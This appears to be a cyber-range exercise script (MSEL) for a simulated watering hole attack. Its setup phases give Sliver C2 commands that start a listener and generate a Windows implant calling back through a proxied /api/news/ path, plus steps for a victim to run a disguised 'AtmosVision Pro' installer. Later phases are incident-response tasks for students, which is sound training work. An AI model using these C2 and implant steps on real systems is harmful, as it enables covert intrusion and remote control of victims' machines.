# Watering Hole Attack - MSEL

## Phase 1: Environment Setup (15 min)

### INJECT-001: Start Sliver C2 Listener (White Cell)

White Cell: SSH into c2-server (10.10.2.30) and configure Sliver.

```bash
sliver-server
```

Inside the Sliver console:
```
http --lport 8080 --lhost 0.0.0.0
generate --http http://10.10.1.20/api/news/ --os windows --arch amd64 --save /home/sliver/builds
```

Copy the generated implant filename for reference.

---

## Phase 2: Attack Execution (15 min)

### INJECT-002: Victim Browses to Weather Site (White Cell)

From the Windows 11 client (10.10.1.10):

1. Open a browser and navigate to `http://10.10.1.20`
2. Click on "Explore" in the navigation
3. Click the "AtmosVision Pro" featured ad
4. Download and execute the installer ZIP
5. Verify C2 session appears in Sliver console

---

## Phase 3: Incident Response (60 min)

### INJECT-003: SOC Alert - Suspicious Outbound Traffic (Student)

> **ALERT**: Network monitoring has detected unusual HTTP traffic patterns from workstation 10.10.1.10. The traffic appears to be periodic beacon-like requests to an internal web server. Investigate and report findings.

Students should:
- Examine running processes on the Windows client
- Analyze network connections
- Identify the suspicious HTTP traffic pattern
- Document the callback URL and frequency

### INJECT-004: Identify C2 Channel (Student)

> **TASK**: Based on your initial findings, determine how the C2 traffic is being routed. Identify the proxy mechanism and the actual C2 endpoint.

Students should discover:
- The `/api/news/` callback path in network captures
- That nginx on the weather server is proxying traffic
- That the actual C2 server is on a different subnet (10.10.2.0/24)
- Students should NOT be able to directly access the C2 server from the victim network
